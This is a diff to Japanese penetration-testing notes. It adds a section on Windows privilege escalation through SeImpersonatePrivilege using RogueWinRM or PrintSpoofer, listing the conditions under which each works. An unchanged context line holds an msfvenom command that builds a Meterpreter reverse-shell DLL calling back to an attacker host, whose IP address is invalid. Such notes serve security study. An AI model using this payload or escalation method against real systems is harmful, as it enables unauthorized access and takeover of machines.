@@ -27,6 +27,24 @@ msfvenom等でバイナリを生成し、DLLやバイナリを生成してリバ
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.293.22 LPORT=4444 -f dll -o hoge.dll
 ```
 
+## Abuse Windows SeImpersonatePrivilege
+### With RogueWinRM
+Windows 10 1809以降に存在する脆弱性を突いた、権限昇格の脆弱性を狙った攻撃。  
+Windows Server 2019, 2016でも動くが、5985ポートをリッスンポートに使うのでWinRMがWindows端末上で動いていると機能しない。
+[脆弱性みっけた人の良記事](https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/)  
+  
+ただしRogueWinRMは、ターゲット上でWinRMが動いているかいないかによて攻撃の成否が決まってしまう。  
+なのでそのような場合はprintspoofer.exeで代替できることがある。
+
+### 攻撃で使用できるツール
+- RogueWinRM
+- PrintSpoofer
+
+### 攻撃の条件
+- 端末のバージョンがWindows 10 1809以降、もしくはWindows Server 2019, 2016であること
+- 端末上で5985ポートを使用していないこと
+- BITSがWindows上で起動していないこと(バックグラウンドでWindows Updateが走ってるときとかはBITSがうごく)
+- 実行ユーザがSeImpersonatePrivilege権限を持っていること
 
 ============-
 # Linux
